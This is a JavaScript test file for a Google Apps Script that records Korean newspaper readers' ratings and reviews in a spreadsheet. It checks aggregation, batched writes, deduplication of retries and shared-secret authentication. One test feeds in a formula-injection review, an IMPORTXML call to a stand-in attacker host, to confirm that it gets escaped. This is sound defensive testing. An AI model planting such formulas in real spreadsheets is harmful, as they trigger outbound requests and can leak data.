import test from 'node:test';
import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import vm from 'node:vm';
import { randomUUID } from 'node:crypto';

const source=await readFile(new URL('../Code.gs',import.meta.url),'utf8');
function scriptFixture(initial) {
  const rows=structuredClone(initial), cache=new Map();let writes=0,locks=0,maxCols=26,maxRows=1000;
  const range=(start,col,n,m)=>({
    getValues:()=>Array.from({length:n},(_,i)=>Array.from({length:m},(_,j)=>rows[start-1+i]?.[col-1+j]??'')),
    setValues:values=>{assert.equal(values.length,n);writes++;values.forEach((row,i)=>{assert.equal(row.length,m);if(!rows[start-1+i])rows[start-1+i]=[];row.forEach((value,j)=>{rows[start-1+i][col-1+j]=value;});});}
  });
  const sheet={getLastRow:()=>rows.length,getRange:range,getMaxColumns:()=>maxCols,insertColumnsAfter:(_,n)=>{maxCols+=n;},getMaxRows:()=>maxRows,insertRowsAfter:(_,n)=>{maxRows+=n;}};
  const context=vm.createContext({console,JSON,Date,Object,Array,Number,String,Math,Error,
    ContentService:{MimeType:{JSON:'application/json'},createTextOutput:body=>({setMimeType:()=>JSON.parse(body)})},
    SpreadsheetApp:{openById:()=>({getSheets:()=>[sheet]}),flush:()=>{}},
    CacheService:{getScriptCache:()=>({get:key=>cache.get(key)||null,put:(key,value)=>cache.set(key,value),remove:key=>cache.delete(key)})},
    PropertiesService:{getScriptProperties:()=>({getProperty:()=> 'shared-test-secret'})},
    LockService:{getScriptLock:()=>({waitLock:()=>{locks++;},releaseLock:()=>{locks--;}})},
    Utilities:{formatDate:()=> '2026-10-21 15:00:00',newBlob:value=>({getBytes:()=>Buffer.from(value)})}
  });
  vm.runInContext(source,context);
  return {rows,context,getWrites:()=>writes,getLocks:()=>locks,post:data=>context.doPost({postData:{contents:JSON.stringify(data)}}),get:()=>context.doGet({parameter:{action:'dashboard'}})};
}
const headers=['제출 시간','방문자 소속','성별','평가할 기사','별점','한 줄 평 및 독자 소감'];
function entry(){const id=randomUUID();return{requestId:id,ticketId:`#HN-2026-${id.replaceAll('-','').slice(0,12).toUpperCase()}`,affiliation:'재학생',gender:'여성',article:'새 기사',articleId:'p1',rating:5,review:'기사 잘 읽었습니다.'};}
test('Apps Script aggregates the existing A-F sheet, including historical articles',()=>{
  const fixture=scriptFixture([headers,['date','재학생','남성','옛 기사',5,'감상'],['date','외부 학생','여성','새 기사',3,'감상'],['','','','','',''],['date','교직원','남성','무효',9,'감상']]);
  const result=fixture.get();assert.equal(result.success,true);assert.equal(result.dashboard.total,2);assert.equal(result.dashboard.average,4);assert.equal(result.dashboard.external,1);
  assert.equal(result.dashboard.articles.find(x=>x.label==='옛 기사').count,1);assert.equal(fixture.getWrites(),0);assert.equal(fixture.getLocks(),0);
  assert(!('spreadsheet_id' in fixture.context.doGet({parameter:{}})));
});
test('Apps Script writes 40 rows in one range, preserves A-F and deduplicates a retry',()=>{
  const historical=['date','재학생','남성','옛 기사',4,'기존 감상'];const fixture=scriptFixture([headers,historical]);const entries=Array.from({length:40},entry);
  const result=fixture.post({sharedSecret:'shared-test-secret',entries});assert.equal(result.success,true);assert.equal(result.receipts.length,40);assert.equal(fixture.rows.length,42);assert.deepEqual(fixture.rows[1],historical);assert.deepEqual(fixture.rows[0].slice(0,6),headers);
  assert.equal(fixture.getWrites(),2); // Added G-I headers plus one batch range.
  const retry=fixture.post({sharedSecret:'shared-test-secret',entries});assert.equal(retry.success,true);assert.equal(fixture.rows.length,42);assert.equal(fixture.getLocks(),0);
  assert.equal(fixture.get().dashboard.total,41);
});
test('Apps Script rejects unauthenticated writes and protects spreadsheet formula input',()=>{
  const fixture=scriptFixture([headers]);const value={...entry(),review:'=IMPORTXML("https://evil.example", "//a")'};
  assert.equal(fixture.post({entries:[value],sharedSecret:'wrong'}).success,false);assert.equal(fixture.rows.length,1);
  assert.equal(fixture.post({entries:[value],sharedSecret:'shared-test-secret'}).success,true);assert.equal(fixture.rows[1][5][0],"'");
  assert.equal(fixture.post({entries:[{...entry(),rating:0}],sharedSecret:'shared-test-secret'}).success,false);assert.equal(fixture.rows.length,2);
});
test('Apps Script preserves occupied G-I columns and releases the lock on failure',()=>{
  const fixture=scriptFixture([[...headers,'기존 다른 데이터']]);
  assert.equal(fixture.post({entries:[entry()],sharedSecret:'shared-test-secret'}).success,false);assert.equal(fixture.rows[0][6],'기존 다른 데이터');assert.equal(fixture.rows.length,1);assert.equal(fixture.getLocks(),0);
});
